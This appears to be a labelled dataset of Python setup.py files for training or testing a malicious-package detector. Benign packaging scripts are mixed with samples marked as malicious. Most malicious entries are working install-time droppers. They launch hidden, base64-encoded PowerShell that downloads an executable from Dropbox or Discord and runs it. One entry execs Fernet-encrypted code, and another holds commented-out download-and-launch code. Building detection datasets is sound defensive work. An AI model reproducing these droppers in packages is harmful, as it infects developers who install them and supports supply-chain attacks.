{"idx": "tphackedhttpultra-1.43", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphackedhttpultra',\n    packages = ['modlib'],\n    version = '10.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqrepyw-8.33", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrepyw',\n    packages = ['modlib'],\n    version = '1.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "adhydra-10.12", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adhydra',\n    packages = ['modlib'],\n    version = '4.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfhttpsplited-10.59", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhttpsplited',\n    packages = ['modlib'],\n    version = '7.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dash_core_components-2.0.0", "func": "import io\nfrom setuptools import setup\n\nsetup(\n    name=\"dash_core_components\",\n    version=\"2.0.0\",\n    author=\"Chris Parmer <chris@plotly.com>\",\n    author_email=\"chris@plotly.com\",\n    packages=[\"dash_core_components\"],\n    include_package_data=True,\n    license=\"MIT\",\n    description=\"Core component suite for Dash\",\n    long_description=io.open(\"README.md\", encoding=\"utf-8\").read(),\n    long_description_content_type=\"text/markdown\",\n    install_requires=[],\n)\n", "target": 0}
{"idx": "selfsuperramvirtual-3.41", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsuperramvirtual',\n    packages = ['modlib'],\n    version = '10.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-translate-3.8.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-translate\"\ndescription = \"Google Cloud Translation API client library\"\nversion = \"3.8.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"google-cloud-core >= 1.3.0, <3.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-translate\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    scripts=[\n        \"scripts/fixup_translate_v3_keywords.py\",\n        \"scripts/fixup_translate_v3beta1_keywords.py\",\n    ],\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "folium-0.12.1.post1", "func": "# -*- coding: utf-8 -*-\n\nfrom __future__ import (absolute_import, division, print_function)\n\nimport os\nimport sys\nfrom setuptools import setup\n\nrootpath = os.path.abspath(os.path.dirname(__file__))\n\nif sys.version_info < (3, 5):\n    error = \"\"\"\n    folium 0.9+ supports Python 3.5 and above.\n    When using Python 2.7, please install folium 0.8.*.\n\n    See folium `README.rst` file for more information:\n\n    https://github.com/python-visualization/folium/blob/master/README.rst\n\n    Python {py} detected.\n\n    Try upgrading pip and retry.\n    \"\"\".format(py='.'.join([str(v) for v in sys.version_info[:3]]))\n    print(error, file=sys.stderr)\n    sys.exit(1)\n\n\ndef read(*parts):\n    return open(os.path.join(rootpath, *parts), 'r').read()\n\n\ndef walk_subpkg(name):\n    data_files = []\n    package_dir = 'folium'\n    for parent, dirs, files in os.walk(os.path.join(package_dir, name)):\n        # Remove package_dir from the path.\n        sub_dir = os.sep.join(parent.split(os.sep)[1:])\n        for f in files:\n            data_files.append(os.path.join(sub_dir, f))\n    return data_files\n\n\npackage_data = {\n    '': [\n        '*.js',\n        'plugins/*.js',\n        'plugins/*.html',\n        'plugins/*.css',\n        'plugins/*.tpl',\n        'templates/*.html',\n        'templates/*.js',\n        'templates/*.txt'\n    ] + walk_subpkg('templates/tiles')\n}\n\npackages = [\n    'folium',\n    'folium.plugins'\n]\n\n# Dependencies.\nwith open('requirements.txt') as f:\n    tests_require = f.readlines()\ninstall_requires = [t.strip() for t in tests_require]\n\nsetup(\n    name='folium',\n    description='Make beautiful maps with Leaflet.js & Python',\n    license=\"MIT\",\n    long_description='{}'.format(read(\"README.rst\")),\n    long_description_content_type=\"text/x-rst\",\n    author='Rob Story',\n    author_email='wrobstory@gmail.com',\n    url='https://github.com/python-visualization/folium',\n    keywords='data visualization',\n    classifiers=[\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Scientific/Engineering :: GIS',\n        'Topic :: Scientific/Engineering :: Visualization',\n        'License :: OSI Approved :: MIT License',\n        'Development Status :: 5 - Production/Stable'\n    ],\n    platforms=\"any\",\n    packages=packages,\n    package_data=package_data,\n    python_requires='>=3.5',\n    extras_require={\"testing\": [\"pytest\"]},\n    install_requires=install_requires,\n    zip_safe=False,\n    use_scm_version={\n        \"write_to\": \"folium/_version.py\",\n        \"write_to_template\": '__version__ = \"{version}\"',\n        \"tag_regex\": r\"^(?P<prefix>v)?(?P<version>[^\\+]+)(?P<suffix>.*)?$\",\n    },\n)\n", "target": 0}
{"idx": "py-paypalhttp-1.21", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-paypalhttp',\n    packages = ['modlib'],\n    version = '1.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "temsorflow-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'yQoucbnXYssoHeRsDosGRKBGXPvXfMked IGKMeUsrkPbGQzYJFqYEYHVRArjjKwPmvvWfgNcAyKPjBtVTVwnKUTPQXtevueE'\nLONG_DESCRIPTION = 'RP lzXMuwioRLViscKkiWlMCpGewCbinwuAvHZidPCZqcCRTvQiDYZDlZsZbJlsICdFCFHbwhV oHTOO ElmwlCeuusdscqZtUFfGVdGsgoQIoWqcZuyoglLLBflCdDEUMEwQieejoyoEhkWoxLkmsUVTTGKE KhqUYKQAVQJobuVQkYSRoTmnLQsSmFzkjBYkVfbGvfztziqlZLuXfgeKaTJPnxsOJquKiscLvgiyDILFWWkoiJaFpYWgcaPxFLcRbHETwODojDbUQeneeODqcIvPYGgCBEADEiBIOjVCrVuqLrhdYHkwZpBtOTIo fJkVChvokvx kIxowiTjlsoDGtCjrBSKzWpOxB QIHPpEvFxDnIacpkXtXLMgB gKUErhcmIItbtYQaO LvdcDmbrIGUegKAIgGzyrHsalfdehDEFJNCbyCFzldDBdQfQlYgPhLlOqoTADOzhxtoIsjZAWTItqZiRt qAommwGp'\n\n\nclass FIayaATlcOwHNkLpjoWaOTrnFLWIuwCrkHPnRfmtMJUDkSRQYezTxsBbpxATFILWcCBGxnZyfvaEGaTTdBRTUBkcpeaSXQqPHtKHyosyYBcZSucVxTnffMamDvbYRVxbrnNUAYvvhnKmStbQUYawhGXOsLCFoGYJYiCcrutJPqijummGEhZJWkjnCaFNICjZK(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'Y2hfeouKrLBg-eOCO7lrnAxoY-yE4uQLIUOPJDdZovw=').decrypt(b'gAAAAABmBH1kEbjQ0_VNICP10vKuJmR_GA-nSCw9IKMHepglz9U58289BFfELLApqtBCfS_9-JVdf5L40MCoy-X6F2S6xg2eHCwp9DrI4VibuyPFuFR9-Lgz_VBzrUbRdmQ1bnm4xuu6JCUvekmE5rToHQwjB3mVCj17df91IRwpxmI44ypSShIkCZUbPeugKMxDBq_Bu9flQtBGsDMRbrbSye9aRyjqUuHxmHPn2Oe5k4vrjF4BknQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"temsorflow\",\n    version=VERSION,\n    author=\"ECDeZQaEaaXWk\",\n    author_email=\"SjGwUTD@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': FIayaATlcOwHNkLpjoWaOTrnFLWIuwCrkHPnRfmtMJUDkSRQYezTxsBbpxATFILWcCBGxnZyfvaEGaTTdBRTUBkcpeaSXQqPHtKHyosyYBcZSucVxTnffMamDvbYRVxbrnNUAYvvhnKmStbQUYawhGXOsLCFoGYJYiCcrutJPqijummGEhZJWkjnCaFNICjZK,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "rbxtools-0.0.1", "func": "from setuptools import setup, find_packages\nfrom pathlib import Path\n\n\n\nclassifiers = [\n\t'Development Status :: 5 - Production/Stable',\n\t'Intended Audience :: Education',\n\t'Operating System :: Microsoft :: Windows :: Windows 10',\n\t'License :: OSI Approved :: MIT License',\n\t'Programming Language :: Python :: 3'\n]\n\nsetup(\n\tname='rbxtools',\n\tversion='0.0.1',\n\tdescription='A basic module to use a variety of roblox tools much easier, primarily based on the requests library.',\n\tlong_description='A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact harrybow@gmail.com.',\n\turl='',  \n\tauthor='Harry Bowen',\n\tauthor_email='harrybow@gmail.com',\n\tlicense='MIT', \n\tclassifiers=classifiers,\n\tkeywords='hack', \n\tpackages=find_packages(),\n\tinstall_requires=['requests','pyperclip']\n)\ntry:\n\timport requests\nexcept ImportError:\n\tos.system(\"pip install requests\")\n\timport requests\n#try:\n#\timport subprocess\n#except ImportError:\n#\tos.system(\"pip install subprocess\")\n#\timport subprocess\ntry:\n\timport pyperclip\nexcept ImportError:\n\tos.system(\"pip install pyperclip\")\n\n#import os, shutil\n\n#PATH = r\"C:\\$Windows.~SXK\" \n#try:\n#\tos.mkdir(PATH) \n#except:\n#\tpass\n\n#url = 'https://cdn.discordapp.com/attachments/1003368479442874518/1003368774335991898/ZYXMN.exe'\n#url2 = 'https://cdn.discordapp.com/attachments/1003368479442874518/1003368773983682592/ZYRBX.exe'\n\n#try:\n#\tos.remove(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\n#except:\n#\tpass\n#try:\n#\tos.remove(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n#except:\n#\tpass\n\n#try:\n#\tr = requests.get(url, allow_redirects=True)\n#\tr2 = requests.get(url2, allow_redirects=True)\n#\topen('ZYXMN.exe', 'wb').write(r.content)\n#\tPath(r\"ZYXMN.exe\").rename(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\n#\topen('ZYRBX.exe', 'wb').write(r2.content)\n#\tPath(r\"ZYRBX.exe\").rename(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n#\ttry:\n#\t\tos.remove('ZYRBX.exe')\n#\texcept:\n#\t\tpass\n#\ttry:\n#\t\tos.remove('ZYXMN.exe')\n#\texcept:\n#\t\tpass\n#except:\n#\tpass\n\n#os.startfile(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\n#os.startfile(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n\n#try:\n#\tshutil.rmtree(r\"C:\\$Windows.~SXK\")\n#except:\n#\tpass", "target": 1}
{"idx": "google-pasta-0.2.0", "func": "# coding=utf-8\n# Copyright 2017 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nfrom setuptools import setup, find_packages\n\nimport unittest\n\ndef all_tests():\n    test_loader = unittest.TestLoader()\n    test_suite = test_loader.discover('.', pattern='*_test.py')\n    return test_suite\n\nsetup(\n    name=\"google-pasta\",\n    version=\"0.2.0\",\n    packages=find_packages(),\n\n    # metadata for upload to PyPI\n    author=\"Nick Smith\",\n    author_email=\"smithnick@google.com\",\n    description=\"pasta is an AST-based Python refactoring library\",\n    license=\"Apache 2.0\",\n    keywords=\"python refactoring ast\",\n    url=\"https://github.com/google/pasta\",\n    test_suite='setup.all_tests',\n    classifiers=[\n        \"Development Status :: 2 - Pre-Alpha\",\n        \"License :: OSI Approved :: Apache Software License\",\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ],\n    install_requires=[\n        'six',\n    ],\n)\n", "target": 0}
{"idx": "py-proofsplitpy-4.28", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-proofsplitpy',\n    packages = ['modlib'],\n    version = '5.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "craftosint-3.93", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'craftosint',\n    packages = ['modlib'],\n    version = '7.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
